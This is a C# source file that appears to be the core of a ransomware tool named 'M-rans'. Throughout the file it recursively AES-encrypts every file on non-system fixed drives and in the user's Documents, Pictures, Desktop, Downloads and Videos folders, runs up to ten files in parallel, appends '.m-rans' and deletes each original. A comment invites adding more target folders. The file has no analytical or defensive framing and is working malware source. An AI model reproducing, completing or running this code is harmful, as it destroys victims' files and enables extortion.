using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace M_Engine
{
    internal class geloo
    {
        private static string Password = config.PassToken;
        private static readonly int MaxDegreeOfParallelism = 10;

        public static void StartEncryption()
        {
            string systemDrive = Environment.GetEnvironmentVariable("SystemDrive").ToUpper();

            DriveInfo[] drives = DriveInfo.GetDrives();

            foreach (DriveInfo drive in drives)
            {
                string driveRoot = drive.RootDirectory.FullName;

                if (drive.DriveType == DriveType.Fixed && !driveRoot.StartsWith(systemDrive))
                {
                    EncryptFilesInDirectory(driveRoot);
                }
            }

            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string[] foldersToEncrypt = { "Downloads", "Documents", "Pictures", "Videos", "Desktop" }; // u Can add custom dirs 

            foreach (string folder in foldersToEncrypt)
            {
                string path = Path.Combine(userProfile, folder);
                if (Directory.Exists(path))
                {
                    EncryptFilesInDirectory(path);
                }
            }
        }

        private static void EncryptFilesInDirectory(string directoryPath)
        {
            try
            {
                string[] files = Directory.GetFiles(directoryPath, "*.*", SearchOption.AllDirectories);

                var tasks = new List<Task>();

                foreach (var file in files)
                {
                    if (tasks.Count >= MaxDegreeOfParallelism)
                    {
                        Task.WhenAny(tasks).Wait();
                        tasks.RemoveAll(t => t.IsCompleted);
                    }

                    var encryptTask = Task.Run(() => EncryptFile(file));
                    tasks.Add(encryptTask);
                }

                Task.WhenAll(tasks).Wait();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error accessing directory {directoryPath}: {ex.Message}");
            }
        }

        private static void EncryptFile(string filePath)
        {
            string encryptedFilePath = filePath + ".m-rans";

            if (filePath.EndsWith(".m-rans")) return;

            try
            {
                using (Aes aes = Aes.Create())
                {
                    byte[] key = GenerateKey(Password, aes.KeySize / 8);
                    byte[] iv = aes.IV;

                    using (FileStream inputFileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                    using (FileStream outputFileStream = new FileStream(encryptedFilePath, FileMode.Create, FileAccess.Write))
                    {
                        outputFileStream.Write(iv, 0, iv.Length);

                        using (CryptoStream cryptoStream = new CryptoStream(outputFileStream, aes.CreateEncryptor(key, iv), CryptoStreamMode.Write))
                        {
                            inputFileStream.CopyTo(cryptoStream);
                        }
                    }
                }

                File.Delete(filePath);
                Console.WriteLine($"Encrypted and deleted: {filePath}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error encrypting {filePath}: {ex.Message}");
            }
        }

        private static byte[] GenerateKey(string password, int keySize)
        {
            using (SHA256 sha256 = SHA256.Create())
            {
                byte[] keyBytes = Encoding.UTF8.GetBytes(password);
                byte[] hash = sha256.ComputeHash(keyBytes);
                Array.Resize(ref hash, keySize);
                return hash;
            }
        }
    }
}